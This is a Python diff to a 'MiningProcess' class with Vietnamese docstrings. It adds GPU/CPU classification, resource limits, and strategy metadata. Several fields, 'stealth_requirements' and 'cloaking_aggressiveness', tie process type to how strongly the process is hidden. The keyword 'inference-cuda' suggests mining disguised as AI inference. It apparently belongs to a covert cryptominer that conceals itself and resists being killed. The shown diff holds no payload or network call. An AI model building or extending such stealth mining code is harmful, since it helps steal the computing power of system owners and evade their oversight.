@@ -457,15 +457,17 @@ class MiningProcess:
         self,
         pid: int,
         name: str,
+        is_gpu: bool = False,
         priority: int = 1,
         network_interface: str = 'eth0',
         logger: Optional[logging.Logger] = None
     ):
         """
-        Khởi tạo MiningProcess.
+        ✅ ENHANCED: Khởi tạo MiningProcess với classification metadata.
 
         :param pid: PID của tiến trình.
         :param name: Tên tiến trình.
+        :param is_gpu: Cờ đánh dấu tiến trình GPU (bool).
         :param priority: Độ ưu tiên (int).
         :param network_interface: Tên giao diện mạng (str).
         :param logger: Đối tượng Logger (nếu None => tạo logger mặc định).
@@ -488,15 +490,147 @@ class MiningProcess:
         # GPUManager (singleton)
         self.gpu_manager = GPUManager()
         self.gpu_initialized = self.gpu_manager.gpu_initialized
+        
+        # ✅ ENHANCED: Classification metadata system
+        self._is_gpu = is_gpu
+        self.process_type = 'GPU' if is_gpu else 'CPU'
+        
+        # 🎯 HARDWARE CLASSIFICATION
+        self.hardware_classification = {
+            'is_gpu_process': is_gpu,
+            'requires_nvml': is_gpu,
+            'resource_requirements': self._determine_resource_requirements(is_gpu),
+            'optimization_profile': self._get_optimization_profile(is_gpu),
+            'hardware_affinity': 'compute_intensive' if is_gpu else 'general_purpose'
+        }
+        
+        # 🚀 STRATEGY OPTIMIZATION HINTS
+        self.strategy_hints = {
+            'preferred_cgroup_config': 'gpu_intensive' if is_gpu else 'cpu_balanced',
+            'stealth_requirements': 'high' if is_gpu else 'medium',
+            'resource_limits': self._calculate_resource_limits(is_gpu),
+            'priority_class': 'high_performance' if is_gpu else 'balanced',
+            'cloaking_aggressiveness': 'aggressive' if is_gpu else 'moderate'
+        }
+        
+        # 📊 METADATA TRACKING
+        self.classification_metadata = {
+            'classification_time': time.time(),
+            'classification_source': 'constructor',
+            'confidence_score': 1.0,  # High confidence from explicit parameter
+            'auto_detected': False,  # Explicitly set via parameter
+            'fallback_classification': self._fallback_classification_check()
+        }
 
     def is_gpu_process(self) -> bool:
         """
-        Kiểm tra xem tiến trình này có liên quan đến GPU (dựa trên tên).
+        ✅ ENHANCED: Kiểm tra process type từ classification metadata.
 
-        :return: True nếu tên tiến trình chứa từ khóa GPU, False nếu không.
+        :return: True nếu process được classified là GPU, False nếu CPU.
         """
-        gpu_process_keywords = ['inference-cuda']
-        return any(keyword in self.name.lower() for keyword in gpu_process_keywords)
+        return self._is_gpu
+    
+    def get_process_type(self) -> str:
+        """
+        ✅ NEW: Get classified process type.
+        
+        :return: 'GPU' hoặc 'CPU' based on classification.
+        """
+        return self.process_type
+    
+    def get_hardware_classification(self) -> Dict[str, Any]:
+        """
+        ✅ NEW: Get hardware classification metadata.
+        
+        :return: Dictionary chứa hardware classification data.
+        """
+        return self.hardware_classification.copy()
+    
+    def get_strategy_hints(self) -> Dict[str, Any]:
+        """
+        ✅ NEW: Get optimization hints for strategies.
+        
+        :return: Dictionary chứa strategy optimization hints.
+        """
+        return self.strategy_hints.copy()
+    
+    def get_classification_metadata(self) -> Dict[str, Any]:
+        """
+        ✅ NEW: Get classification metadata và tracking info.
+        
+        :return: Dictionary chứa classification metadata.
+        """
+        return self.classification_metadata.copy()
+    
+    def _determine_resource_requirements(self, is_gpu: bool) -> Dict[str, Any]:
+        """
+        ✅ HELPER: Determine resource requirements based on process type.
+        
+        :param is_gpu: Process type indicator.
+        :return: Resource requirements dictionary.
+        """
+        if is_gpu:
+            return {
+                'memory_intensive': True,
+                'compute_intensive': True,
+                'bandwidth_requirements': 'high',
+                'thermal_impact': 'significant',
+                'power_consumption': 'high'
+            }
+        else:
+            return {
+                'memory_intensive': False,
+                'compute_intensive': 'moderate',
+                'bandwidth_requirements': 'medium',
+                'thermal_impact': 'minimal',
+                'power_consumption': 'low'
+            }
+    
+    def _get_optimization_profile(self, is_gpu: bool) -> str:
+        """
+        ✅ HELPER: Get optimization profile for process type.
+        
+        :param is_gpu: Process type indicator.
+        :return: Optimization profile string.
+        """
+        return 'gpu_compute_optimized' if is_gpu else 'cpu_general_purpose'
+    
+    def _calculate_resource_limits(self, is_gpu: bool) -> Dict[str, Any]:
+        """
+        ✅ HELPER: Calculate appropriate resource limits.
+        
+        :param is_gpu: Process type indicator.
+        :return: Resource limits dictionary.
+        """
+        if is_gpu:
+            return {
+                'cpu_limit_percent': 80,  # Allow high CPU for GPU processes
+                'memory_limit_mb': 4096,  # Higher memory limit
+                'nice_priority': -5,      # Higher priority
+                'oom_score_adj': -500     # Lower OOM score
+            }
+        else:
+            return {
+                'cpu_limit_percent': 60,  # More conservative CPU limit
+                'memory_limit_mb': 2048,  # Lower memory limit
+                'nice_priority': 10,      # Lower priority
+                'oom_score_adj': 0        # Default OOM score
+            }
+    
+    def _fallback_classification_check(self) -> Dict[str, Any]:
+        """
+        ✅ HELPER: Fallback classification dựa trên process name.
+        
+        :return: Fallback classification results.
+        """
+        gpu_keywords = ['inference-cuda', 'gpu', 'cuda', 'nvidia']
+        name_based_gpu = any(keyword in self.name.lower() for keyword in gpu_keywords)
+        
+        return {
+            'name_based_classification': 'GPU' if name_based_gpu else 'CPU',
+            'matches_explicit': name_based_gpu == self._is_gpu,
+            'confidence': 0.8 if name_based_gpu else 0.6
+        }
 
     def get_gpu_usage(self) -> float:
         """
